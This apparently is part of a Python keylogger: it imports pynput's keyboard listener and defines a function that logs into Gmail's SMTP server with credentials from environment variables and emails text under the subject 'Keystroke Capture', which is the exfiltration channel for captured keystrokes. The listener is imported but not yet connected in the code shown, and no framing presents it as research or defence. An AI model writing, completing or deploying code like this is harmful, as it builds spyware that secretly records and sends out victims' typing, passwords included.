import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import ssl
import os

# Securely get SMTP credentials from environment variables
smtp_user = os.getenv('SMTP_USER')
smtp_password = os.getenv('SMTP_PASSWORD')

def send_email(message):
    smtp_server = "smtp.gmail.com"
    port = 587  # For starttls
    sender_email = smtp_user  # Sender's email
    receiver_email = smtp_user  # Could be any recipient's email

    # Create a secure SSL context
    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.starttls(context=context)  # Secure the connection
        server.login(sender_email, smtp_password)

        # Create a multipart message and set headers
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = 'Keystroke Capture'

        # Add body to email
        msg.attach(MIMEText(message, 'plain'))

        server.sendmail(sender_email, receiver_email, msg.as_string())
        print("Email sent successfully!")

    except Exception as e:
        print(f"Failed to send email: {e}")

    finally:
        server.quit()